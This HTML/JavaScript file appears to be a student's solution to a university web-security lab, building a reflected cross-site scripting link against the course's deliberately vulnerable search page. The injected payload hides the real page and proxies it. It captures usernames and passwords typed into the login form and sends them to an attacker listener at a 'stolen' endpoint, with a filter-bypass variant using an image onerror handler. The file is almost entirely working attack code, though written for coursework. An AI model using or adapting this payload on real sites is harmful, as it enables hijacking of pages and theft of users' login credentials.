<html>
<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
</script>
<script>

//http://127.0.0.1:31337/stolen?event=login&user=<username>&pass=<password>
// http://127.0.0.1:31337/stolen?event=logout&user=<username>		      
// "NewFile", param);
// Extend this function:
			  // $.get("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=pwned", 
			  // function(e){
			  // 	document.write(e);
			  //   console.log(e);
			  // });
function payload(attacker) {
	function proxy(href) {
		$("html").load(href, function(){
		$("html").show();
			var realURL = window.location.href;
			// history.pushState(null, '', '/project3'); 
			// var searchAgain = $("#search-again-btn");
			var s=realURL.split("q=");
		    $("#search-btn").click(function(e){
		      var q = $("#query").val();
			  $.get("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=" + q, 
			  function(e){
			  	document.write(e);
			  });
			  e.preventDefault();
  		      proxy("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=" + q);
		      // window.location.href = s[0] + "q=" + q;
			  // window.location.replace(s[0] + "q=" + q + s[1]);
	        }); 
	        $("#search-again-btn").click(function(e){
		      e.preventDefault();
		      alert(0)
			  $.get("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=pwned", 
			  function(e){
			  	document.write(e);
			    console.log(e);
			  });
			  window.location.replace("realURL");
	        }); 
		    $("#log-in-btn").click(function(e){
		      e.preventDefault();
			  $.post("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", 
			  {username: $('#username').val(), password: $('#userpass').val()});
			  $.get(attacker+"stolen?event=login&user="+$('#username').val()+"&pass=" +$('#userpass').val());
			  window.location.replace(realURL);
	        }); 
		    $("#new-account-btn").click(function(e){
		      e.preventDefault();
			  $.post("http://cis551.cis.upenn.edu/project3/create?csrfdefense=0&xssdefense=4", 
			  {username: $('#username').val(), password: $('#userpass').val()}) 
			  window.location.replace(realURL);
	        }); 
		    $("#log-out-btn").click(function(e){
		      alert(1);
		      e.preventDefault();
			  $.post("http://cis551.cis.upenn.edu/project3/logout?csrfdefense=0&xssdefense=4")
			  $.get(attacker + "stolen?event=logout&user="+$('#logged-in-user').text());
			  window.location.replace(realURL);
	        }); 
			});
		}
	$("html").hide();
	proxy("./");
}

function test() {
	alert(4);
}
//<script>a%00lert(1)

function makeLink(xssdefense, target, attacker) {
		if (xssdefense == 0) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<script" + ">" + payload.toString() +
			";payload(\"" + attacker + "\");" + "</" + "script" + ">");
		} else if (xssdefense == 1) {
			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<img src=a  onerror=(" + test.toString() +
			"; test(); >");
			//payload(\"" + attacker + "\");" + ">");
		}
	}
	var xssdefense = 1;
	var target = "http://cis551.cis.upenn.edu/project3/";
	var attacker = "http://127.0.0.1:31337/";

	$(function() {
		var url = makeLink(xssdefense, target, attacker);
		$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
	});
</script>

<h3></h3>
</html>